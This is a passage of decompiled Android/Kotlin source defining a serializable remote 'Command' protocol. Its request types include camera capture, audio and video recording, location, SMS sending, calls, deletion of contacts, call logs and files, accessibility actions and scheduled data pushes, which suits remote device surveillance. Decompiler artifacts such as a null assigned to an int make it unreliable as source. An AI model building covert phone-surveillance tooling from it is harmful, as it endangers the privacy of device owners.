            int i10;
            int i11;
            K.n(size2, "size");
            K.n(captureMode2, "captureMode");
            K.n(flashMode2, "flashMode");
            K.n(flashType2, "flashType");
            K.n(lensFacing2, "lensFacing");
            K.n(aspectRatio2, "aspectRatio");
            K.n(rotation2, "rotation");
            this.jpegQuality = i5;
            this.size = size2;
            this.takePictureDelay = j5;
            this.saveToPrivate = z4;
            this.captureMode = captureMode2;
            this.flashMode = flashMode2;
            this.flashType = flashType2;
            this.lensFacing = lensFacing2;
            this.aspectRatio = aspectRatio2;
            this.rotation = rotation2;
            int i12 = WhenMappings.$EnumSwitchMapping$0[captureMode2.ordinal()];
            if (i12 == 1) {
                i6 = 0;
            } else if (i12 == 2) {
                i6 = 1;
            } else if (i12 == 3) {
                i6 = 2;
            } else {
                throw new RuntimeException();
            }
            this.mCaptureMode = i6;
            int i13 = WhenMappings.$EnumSwitchMapping$1[flashMode2.ordinal()];
            if (i13 == 1) {
                i7 = 0;
            } else if (i13 == 2) {
                i7 = 1;
            } else if (i13 == 3) {
                i7 = 2;
            } else {
                throw new RuntimeException();
            }
            this.mFlashMode = i7;
            int i14 = WhenMappings.$EnumSwitchMapping$2[flashType2.ordinal()];
            if (i14 == 1) {
                i8 = 0;
            } else if (i14 == 2) {
                i8 = 1;
            } else {
                throw new RuntimeException();
            }
            this.mFlashType = i8;
            int i15 = WhenMappings.$EnumSwitchMapping$3[lensFacing2.ordinal()];
            if (i15 == 1) {
                i9 = 0;
            } else if (i15 == 2) {
                i9 = 1;
            } else {
                throw new RuntimeException();
            }
            this.mLensFacing = i9;
            int i16 = WhenMappings.$EnumSwitchMapping$4[aspectRatio2.ordinal()];
            if (i16 == 1) {
                i10 = 0;
            } else if (i16 == 2) {
                i10 = 1;
            } else {
                throw new RuntimeException();
            }
            this.mAspectRatio = i10;
            int i17 = WhenMappings.$EnumSwitchMapping$5[rotation2.ordinal()];
            if (i17 == 1) {
                i11 = 0;
            } else if (i17 == 2) {
                i11 = 1;
            } else if (i17 == 3) {
                i11 = 2;
            } else if (i17 == 4) {
                i11 = 3;
            } else if (i17 == 5) {
                i11 = null;
            } else {
                throw new RuntimeException();
            }
            this.mRotation = i11;
        }
    }

    public Command() {
        this((CommandType) null, 0, (ThumbnailRequest) null, (FileRequest) null, (FilesRequest) null, (DeletePendingPushFilesRequest) null, (DeleteFileRequest) null, (AddCallLogRequest) null, (DeleteCallLogRequest) null, (AddContactRequest) null, (DeleteContactRequest) null, (SendMessageRequest) null, (GetLocationRequest) null, (VibrateRequest) null, (FlashRequest) null, (TakePictureRequest) null, (RecordVideoRequest) null, (RecordAudioRequest) null, (PushDeviceInfoRequest) null, (OpenAppRequest) null, (MakeCallRequest) null, (DeviceAudioRequest) null, (OpenDeeplinkRequest) null, (LoginRequest) null, (ScheduleCommandRequest) null, (CancelScheduledCommandRequest) null, (AccessibilityCommandRequest) null, (StartRepeatPushDataRequest) null, (SetDynamicConfigRequest) null, (SyncAppConfigRequest) null, 1073741823, (j3.f) null);
    }

    public static /* synthetic */ void getAccessibilityCommandRequest$annotations() {
    }

    public static /* synthetic */ void getAddCallLogRequest$annotations() {
    }

    public static /* synthetic */ void getAddContactRequest$annotations() {
    }

    public static /* synthetic */ void getCancelScheduledCommandRequest$annotations() {
    }

    public static /* synthetic */ void getDeleteCallLogRequest$annotations() {
    }

    public static /* synthetic */ void getDeleteContactRequest$annotations() {
    }

    public static /* synthetic */ void getDeleteFileRequest$annotations() {
    }

    public static /* synthetic */ void getDeletePendingPushFilesRequest$annotations() {
    }

    public static /* synthetic */ void getDeviceInfoRequest$annotations() {
    }

    public static /* synthetic */ void getFileRequest$annotations() {
    }

    public static /* synthetic */ void getFilesRequest$annotations() {
    }

    public static /* synthetic */ void getFlashRequest$annotations() {
    }

    public static /* synthetic */ void getGetLocationRequest$annotations() {
    }

    public static /* synthetic */ void getLoginRequest$annotations() {
    }

    public static /* synthetic */ void getMakeCallRequest$annotations() {
    }

    public static /* synthetic */ void getOpenAppRequest$annotations() {
    }

    public static /* synthetic */ void getOpenDeeplinkRequest$annotations() {
    }

    public static /* synthetic */ void getRecordAudioRequest$annotations() {
    }

    public static /* synthetic */ void getRecordVideoRequest$annotations() {
    }

    public static /* synthetic */ void getScheduleCommandRequest$annotations() {
    }

    public static /* synthetic */ void getSendMessageRequest$annotations() {
    }

    public static /* synthetic */ void getSentTime$annotations() {
    }

    public static /* synthetic */ void getSetDeviceAudioRequest$annotations() {
    }

    public static /* synthetic */ void getSetDynamicConfigRequest$annotations() {
    }

    public static /* synthetic */ void getStartRepeatPushDataRequest$annotations() {
    }

    public static /* synthetic */ void getSyncAppConfigRequest$annotations() {
    }

    public static /* synthetic */ void getTakePictureRequest$annotations() {
    }

    public static /* synthetic */ void getThumbnailRequest$annotations() {
    }

    public static /* synthetic */ void getType$annotations() {
    }

    public static /* synthetic */ void getVibrateRequest$annotations() {
    }

    public static final /* synthetic */ void write$Self$library_release(Command command, b bVar, SerialDescriptor serialDescriptor) {
        if (bVar.q(serialDescriptor) || command.type != CommandType.Unknown) {
            ((q) bVar).e0(serialDescriptor, 0, CommandTypeSerializer.INSTANCE, command.type);
        }
        if (bVar.q(serialDescriptor) || command.sentTime != System.currentTimeMillis()) {
            ((q) bVar).d0(serialDescriptor, 1, command.sentTime);
        }
        if (bVar.q(serialDescriptor) || command.thumbnailRequest != null) {
            bVar.s(serialDescriptor, 2, Command$ThumbnailRequest$$serializer.INSTANCE, command.thumbnailRequest);
        }
        if (bVar.q(serialDescriptor) || command.fileRequest != null) {
            bVar.s(serialDescriptor, 3, Command$FileRequest$$serializer.INSTANCE, command.fileRequest);
        }
        if (bVar.q(serialDescriptor) || command.filesRequest != null) {
            bVar.s(serialDescriptor, 4, Command$FilesRequest$$serializer.INSTANCE, command.filesRequest);
        }
        if (bVar.q(serialDescriptor) || command.deletePendingPushFilesRequest != null) {
            bVar.s(serialDescriptor, 5, Command$DeletePendingPushFilesRequest$$serializer.INSTANCE, command.deletePendingPushFilesRequest);
        }
        if (bVar.q(serialDescriptor) || command.deleteFileRequest != null) {
            bVar.s(serialDescriptor, 6, Command$DeleteFileRequest$$serializer.INSTANCE, command.deleteFileRequest);
        }
        if (bVar.q(serialDescriptor) || command.addCallLogRequest != null) {
            bVar.s(serialDescriptor, 7, Command$AddCallLogRequest$$serializer.INSTANCE, command.addCallLogRequest);
        }
        if (bVar.q(serialDescriptor) || command.deleteCallLogRequest != null) {
            bVar.s(serialDescriptor, 8, Command$DeleteCallLogRequest$$serializer.INSTANCE, command.deleteCallLogRequest);
        }
        if (bVar.q(serialDescriptor) || command.addContactRequest != null) {
            bVar.s(serialDescriptor, 9, Command$AddContactRequest$$serializer.INSTANCE, command.addContactRequest);
        }
        if (bVar.q(serialDescriptor) || command.deleteContactRequest != null) {
            bVar.s(serialDescriptor, 10, Command$DeleteContactRequest$$serializer.INSTANCE, command.deleteContactRequest);
        }
        if (bVar.q(serialDescriptor) || command.sendMessageRequest != null) {
            bVar.s(serialDescriptor, 11, Command$SendMessageRequest$$serializer.INSTANCE, command.sendMessageRequest);
        }
        if (bVar.q(serialDescriptor) || command.getLocationRequest != null) {
            bVar.s(serialDescriptor, 12, Command$GetLocationRequest$$serializer.INSTANCE, command.getLocationRequest);
        }
        if (bVar.q(serialDescriptor) || command.vibrateRequest != null) {
            bVar.s(serialDescriptor, 13, Command$VibrateRequest$$serializer.INSTANCE, command.vibrateRequest);
        }
        if (bVar.q(serialDescriptor) || command.flashRequest != null) {
            bVar.s(serialDescriptor, 14, Command$FlashRequest$$serializer.INSTANCE, command.flashRequest);
        }
        if (bVar.q(serialDescriptor) || command.takePictureRequest != null) {
            bVar.s(serialDescriptor, 15, Command$TakePictureRequest$$serializer.INSTANCE, command.takePictureRequest);
        }
        if (bVar.q(serialDescriptor) || command.recordVideoRequest != null) {
            bVar.s(serialDescriptor, 16, Command$RecordVideoRequest$$serializer.INSTANCE, command.recordVideoRequest);
        }
        if (bVar.q(serialDescriptor) || command.recordAudioRequest != null) {
            bVar.s(serialDescriptor, 17, Command$RecordAudioRequest$$serializer.INSTANCE, command.recordAudioRequest);
        }
        if (bVar.q(serialDescriptor) || command.deviceInfoRequest != null) {
            bVar.s(serialDescriptor, 18, Command$PushDeviceInfoRequest$$serializer.INSTANCE, command.deviceInfoRequest);
        }
        if (bVar.q(serialDescriptor) || command.openAppRequest != null) {
            bVar.s(serialDescriptor, 19, Command$OpenAppRequest$$serializer.INSTANCE, command.openAppRequest);
        }
        if (bVar.q(serialDescriptor) || command.makeCallRequest != null) {
            bVar.s(serialDescriptor, 20, Command$MakeCallRequest$$serializer.INSTANCE, command.makeCallRequest);
        }
        if (bVar.q(serialDescriptor) || command.setDeviceAudioRequest != null) {
            bVar.s(serialDescriptor, 21, Command$DeviceAudioRequest$$serializer.INSTANCE, command.setDeviceAudioRequest);
        }
        if (bVar.q(serialDescriptor) || command.openDeeplinkRequest != null) {
            bVar.s(serialDescriptor, 22, Command$OpenDeeplinkRequest$$serializer.INSTANCE, command.openDeeplinkRequest);
        }
        if (bVar.q(serialDescriptor) || command.loginRequest != null) {
            bVar.s(serialDescriptor, 23, Command$LoginRequest$$serializer.INSTANCE, command.loginRequest);
        }
        if (bVar.q(serialDescriptor) || command.scheduleCommandRequest != null) {
            bVar.s(serialDescriptor, 24, Command$ScheduleCommandRequest$$serializer.INSTANCE, command.scheduleCommandRequest);
        }
        if (bVar.q(serialDescriptor) || command.cancelScheduledCommandRequest != null) {
            bVar.s(serialDescriptor, 25, Command$CancelScheduledCommandRequest$$serializer.INSTANCE, command.cancelScheduledCommandRequest);
        }
        if (bVar.q(serialDescriptor) || command.accessibilityCommandRequest != null) {
            bVar.s(serialDescriptor, 26, Command$AccessibilityCommandRequest$$serializer.INSTANCE, command.accessibilityCommandRequest);
        }
        if (bVar.q(serialDescriptor) || command.startRepeatPushDataRequest != null) {
            bVar.s(serialDescriptor, 27, Command$StartRepeatPushDataRequest$$serializer.INSTANCE, command.startRepeatPushDataRequest);
        }
        if (bVar.q(serialDescriptor) || command.setDynamicConfigRequest != null) {
            bVar.s(serialDescriptor, 28, Command$SetDynamicConfigRequest$$serializer.INSTANCE, command.setDynamicConfigRequest);
        }
        if (bVar.q(serialDescriptor) || command.syncAppConfigRequest != null) {
            bVar.s(serialDescriptor, 29, Command$SyncAppConfigRequest$$serializer.INSTANCE, command.syncAppConfigRequest);
        }
    }

    public final AccessibilityCommandRequest getAccessibilityCommandRequest() {
        return this.accessibilityCommandRequest;
    }

    public final AddCallLogRequest getAddCallLogRequest() {
        return this.addCallLogRequest;
    }

    public final AddContactRequest getAddContactRequest() {
        return this.addContactRequest;
    }

    public final CancelScheduledCommandRequest getCancelScheduledCommandRequest() {
        return this.cancelScheduledCommandRequest;
    }

    public final DeleteCallLogRequest getDeleteCallLogRequest() {
        return this.deleteCallLogRequest;
    }

    public final DeleteContactRequest getDeleteContactRequest() {
        return this.deleteContactRequest;
    }

    public final DeleteFileRequest getDeleteFileRequest() {
        return this.deleteFileRequest;
    }

    public final DeletePendingPushFilesRequest getDeletePendingPushFilesRequest() {
        return this.deletePendingPushFilesRequest;
    }

    public final PushDeviceInfoRequest getDeviceInfoRequest() {
        return this.deviceInfoRequest;
    }

    public final FileRequest getFileRequest() {
        return this.fileRequest;
    }

    public final FilesRequest getFilesRequest() {
        return this.filesRequest;
    }

    public final FlashRequest getFlashRequest() {
        return this.flashRequest;
    }

    public final GetLocationRequest getGetLocationRequest() {
        return this.getLocationRequest;
    }

    public final LoginRequest getLoginRequest() {
        return this.loginRequest;
    }

    public final MakeCallRequest getMakeCallRequest() {
        return this.makeCallRequest;
    }

    public final OpenAppRequest getOpenAppRequest() {
        return this.openAppRequest;
    }

    public final OpenDeeplinkRequest getOpenDeeplinkRequest() {
        return this.openDeeplinkRequest;
    }

    public final RecordAudioRequest getRecordAudioRequest() {
        return this.recordAudioRequest;
    }

    public final RecordVideoRequest getRecordVideoRequest() {
        return this.recordVideoRequest;
    }

    public final ScheduleCommandRequest getScheduleCommandRequest() {
        return this.scheduleCommandRequest;
    }

    public final SendMessageRequest getSendMessageRequest() {
        return this.sendMessageRequest;
    }

    public final long getSentTime() {
        return this.sentTime;
    }

    public final DeviceAudioRequest getSetDeviceAudioRequest() {
        return this.setDeviceAudioRequest;
    }

    public final SetDynamicConfigRequest getSetDynamicConfigRequest() {
        return this.setDynamicConfigRequest;
    }

    public final StartRepeatPushDataRequest getStartRepeatPushDataRequest() {
        return this.startRepeatPushDataRequest;
    }

    public final SyncAppConfigRequest getSyncAppConfigRequest() {
        return this.syncAppConfigRequest;
    }

    public final TakePictureRequest getTakePictureRequest() {
        return this.takePictureRequest;
    }

    public final ThumbnailRequest getThumbnailRequest() {
        return this.thumbnailRequest;
    }

    public final CommandType getType() {
        return this.type;
    }

    public final VibrateRequest getVibrateRequest() {
        return this.vibrateRequest;
    }

    @f
    public static final class AccessibilityCommandRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {Type.Companion.serializer(), GlobalAction.Companion.serializer()};
        public static final Companion Companion = new Companion((j3.f) null);
        private final GlobalAction action;
        private final Type type;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$AccessibilityCommandRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum GlobalAction {
            Back(1),
            Home(2),
            Recent(3),
            Notifications(4),
            QuickSettings(5),
            PowerDialog(6),
            LockScreen(8),
            DismissNotificationShade(15),
            TakeScreenshot(9);
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;
            private final int value;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) GlobalAction.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                GlobalAction[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, a.f4885D);
            }

            private GlobalAction(int i5) {
                this.value = i5;
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }

            public final int getValue() {
                return this.value;
            }
        }

        @f
        public enum Type {
            PerformGlobalAction,
            TakeScreenshot;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) Type.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                Type[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, b.f4886D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public /* synthetic */ AccessibilityCommandRequest(int i5, Type type2, GlobalAction globalAction, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.type = type2;
                if ((i5 & 2) == 0) {
                    this.action = null;
                } else {
                    this.action = globalAction;
                }
            } else {
                w.x(i5, 1, Command$AccessibilityCommandRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getAction$annotations() {
        }

        public static /* synthetic */ void getType$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(AccessibilityCommandRequest accessibilityCommandRequest, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            q qVar = (q) bVar;
            qVar.e0(serialDescriptor, 0, kSerializerArr[0], accessibilityCommandRequest.type);
            if (qVar.q(serialDescriptor) || accessibilityCommandRequest.action != null) {
                qVar.s(serialDescriptor, 1, kSerializerArr[1], accessibilityCommandRequest.action);
            }
        }

        public final GlobalAction getAction() {
            return this.action;
        }

        public final Type getType() {
            return this.type;
        }

        /* JADX INFO: this call moved to the top of the method (can break code semantics) */
        public /* synthetic */ AccessibilityCommandRequest(Type type2, GlobalAction globalAction, int i5, j3.f fVar) {
            this(type2, (i5 & 2) != 0 ? null : globalAction);
        }

        public AccessibilityCommandRequest(Type type2, GlobalAction globalAction) {
            K.n(type2, "type");
            this.type = type2;
            this.action = globalAction;
        }
    }

    @f
    public static final class AddCallLogRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final CallLog callLog;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$AddCallLogRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ AddCallLogRequest(int i5, CallLog callLog2, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.callLog = callLog2;
            } else {
                w.x(i5, 1, Command$AddCallLogRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getCallLog$annotations() {
        }

        public final CallLog getCallLog() {
            return this.callLog;
        }

        public AddCallLogRequest(CallLog callLog2) {
            K.n(callLog2, "callLog");
            this.callLog = callLog2;
        }
    }

    @f
    public static final class AddContactRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final Contact contact;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$AddContactRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ AddContactRequest(int i5, Contact contact2, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.contact = contact2;
            } else {
                w.x(i5, 1, Command$AddContactRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getContact$annotations() {
        }

        public final Contact getContact() {
            return this.contact;
        }

        public AddContactRequest(Contact contact2) {
            K.n(contact2, "contact");
            this.contact = contact2;
        }
    }

    @f
    public static final class CancelScheduledCommandRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {new C0020d(O.f456a, 0)};
        public static final Companion Companion = new Companion((j3.f) null);
        private final List<Integer> requestCodes;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$CancelScheduledCommandRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ CancelScheduledCommandRequest(int i5, List list, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.requestCodes = list;
            } else {
                w.x(i5, 1, Command$CancelScheduledCommandRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getRequestCodes$annotations() {
        }

        public final List<Integer> getRequestCodes() {
            return this.requestCodes;
        }

        public CancelScheduledCommandRequest(List<Integer> list) {
            K.n(list, "requestCodes");
            this.requestCodes = list;
        }
    }

    @f
    public static final class DeleteCallLogRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String id;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$DeleteCallLogRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ DeleteCallLogRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.id = str;
            } else {
                w.x(i5, 1, Command$DeleteCallLogRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getId$annotations() {
        }

        public final String getId() {
            return this.id;
        }

        public DeleteCallLogRequest(String str) {
            K.n(str, "id");
            this.id = str;
        }
    }

    @f
    public static final class DeleteContactRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String id;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$DeleteContactRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ DeleteContactRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.id = str;
            } else {
                w.x(i5, 1, Command$DeleteContactRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getId$annotations() {
        }

        public final String getId() {
            return this.id;
        }

        public DeleteContactRequest(String str) {
            K.n(str, "id");
            this.id = str;
        }
    }

    @f
    public static final class DeleteFileRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String path;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$DeleteFileRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ DeleteFileRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.path = str;
            } else {
                w.x(i5, 1, Command$DeleteFileRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getPath$annotations() {
        }

        public final String getPath() {
            return this.path;
        }

        public DeleteFileRequest(String str) {
            K.n(str, "path");
            this.path = str;
        }
    }

    @f
    public static final class DeletePendingPushFilesRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {new C0020d(O.f456a, 0)};
        public static final Companion Companion = new Companion((j3.f) null);
        private final List<Integer> ids;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$DeletePendingPushFilesRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ DeletePendingPushFilesRequest(int i5, List list, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.ids = list;
            } else {
                w.x(i5, 1, Command$DeletePendingPushFilesRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getIds$annotations() {
        }

        public final List<Integer> getIds() {
            return this.ids;
        }

        public DeletePendingPushFilesRequest(List<Integer> list) {
            K.n(list, "ids");
            this.ids = list;
        }
    }

    @f
    public static final class LoginRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String email;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$LoginRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ LoginRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.email = str;
            } else {
                w.x(i5, 1, Command$LoginRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getEmail$annotations() {
        }

        public final String getEmail() {
            return this.email;
        }

        public LoginRequest(String str) {
            K.n(str, NotificationCompat.CATEGORY_EMAIL);
            this.email = str;
        }
    }

    @f
    public static final class MakeCallRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String phoneNumber;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$MakeCallRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ MakeCallRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.phoneNumber = str;
            } else {
                w.x(i5, 1, Command$MakeCallRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getPhoneNumber$annotations() {
        }

        public final String getPhoneNumber() {
            return this.phoneNumber;
        }

        public MakeCallRequest(String str) {
            K.n(str, "phoneNumber");
            this.phoneNumber = str;
        }
    }

    @f
    public static final class OpenAppRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String packageName;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$OpenAppRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ OpenAppRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.packageName = str;
            } else {
                w.x(i5, 1, Command$OpenAppRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getPackageName$annotations() {
        }

        public final String getPackageName() {
            return this.packageName;
        }

        public OpenAppRequest(String str) {
            K.n(str, "packageName");
            this.packageName = str;
        }
    }

    @f
    public static final class OpenDeeplinkRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String deeplink;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$OpenDeeplinkRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ OpenDeeplinkRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.deeplink = str;
            } else {
                w.x(i5, 1, Command$OpenDeeplinkRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getDeeplink$annotations() {
        }

        public final String getDeeplink() {
            return this.deeplink;
        }

        public OpenDeeplinkRequest(String str) {
            K.n(str, "deeplink");
            this.deeplink = str;
        }
    }

    @f
    public static final class ScheduleCommandRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final Command command;
        private final long interval;
        private final int requestCode;
        private final long triggerAt;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$ScheduleCommandRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ ScheduleCommandRequest(int i5, Command command2, long j5, long j6, int i6, q0 q0Var) {
            if (15 == (i5 & 15)) {
                this.command = command2;
                this.triggerAt = j5;
                this.interval = j6;
                this.requestCode = i6;
                return;
            }
            w.x(i5, 15, Command$ScheduleCommandRequest$$serializer.INSTANCE.getDescriptor());
            throw null;
        }

        public static /* synthetic */ void getCommand$annotations() {
        }

        public static /* synthetic */ void getInterval$annotations() {
        }

        public static /* synthetic */ void getRequestCode$annotations() {
        }

        public static /* synthetic */ void getTriggerAt$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(ScheduleCommandRequest scheduleCommandRequest, b bVar, SerialDescriptor serialDescriptor) {
            q qVar = (q) bVar;
            qVar.e0(serialDescriptor, 0, Command$$serializer.INSTANCE, scheduleCommandRequest.command);
            qVar.d0(serialDescriptor, 1, scheduleCommandRequest.triggerAt);
            qVar.d0(serialDescriptor, 2, scheduleCommandRequest.interval);
            qVar.c0(3, scheduleCommandRequest.requestCode, serialDescriptor);
        }

        public final Command getCommand() {
            return this.command;
        }

        public final long getInterval() {
            return this.interval;
        }

        public final int getRequestCode() {
            return this.requestCode;
        }

        public final long getTriggerAt() {
            return this.triggerAt;
        }

        public ScheduleCommandRequest(Command command2, long j5, long j6, int i5) {
            K.n(command2, "command");
            this.command = command2;
            this.triggerAt = j5;
            this.interval = j6;
            this.requestCode = i5;
        }
    }

    @f
    public static final class SendMessageRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String message;
        private final String number;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$SendMessageRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ SendMessageRequest(int i5, String str, String str2, q0 q0Var) {
            if (3 == (i5 & 3)) {
                this.number = str;
                this.message = str2;
                return;
            }
            w.x(i5, 3, Command$SendMessageRequest$$serializer.INSTANCE.getDescriptor());
            throw null;
        }

        public static /* synthetic */ void getMessage$annotations() {
        }

        public static /* synthetic */ void getNumber$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(SendMessageRequest sendMessageRequest, b bVar, SerialDescriptor serialDescriptor) {
            q qVar = (q) bVar;
            qVar.f0(serialDescriptor, 0, sendMessageRequest.number);
            qVar.f0(serialDescriptor, 1, sendMessageRequest.message);
        }

        public final String getMessage() {
            return this.message;
        }

        public final String getNumber() {
            return this.number;
        }

        public SendMessageRequest(String str, String str2) {
            K.n(str, "number");
            K.n(str2, "message");
            this.number = str;
            this.message = str2;
        }
    }

    @f
    public static final class SetDynamicConfigRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String config;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$SetDynamicConfigRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ SetDynamicConfigRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.config = str;
            } else {
                w.x(i5, 1, Command$SetDynamicConfigRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getConfig$annotations() {
        }

        public final String getConfig() {
            return this.config;
        }

        public SetDynamicConfigRequest(String str) {
            K.n(str, "config");
            this.config = str;
        }
    }

    @f
    public static final class StartRepeatPushDataRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final long intervalMillis;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$StartRepeatPushDataRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ StartRepeatPushDataRequest(int i5, long j5, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.intervalMillis = j5;
            } else {
                w.x(i5, 1, Command$StartRepeatPushDataRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getIntervalMillis$annotations() {
        }

        public final long getIntervalMillis() {
            return this.intervalMillis;
        }

        public StartRepeatPushDataRequest(long j5) {
            this.intervalMillis = j5;
        }
    }

    @f
    public static final class ThumbnailRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {new C0020d(u0.f536a, 0)};
        public static final Companion Companion = new Companion((j3.f) null);
        private final List<String> list;

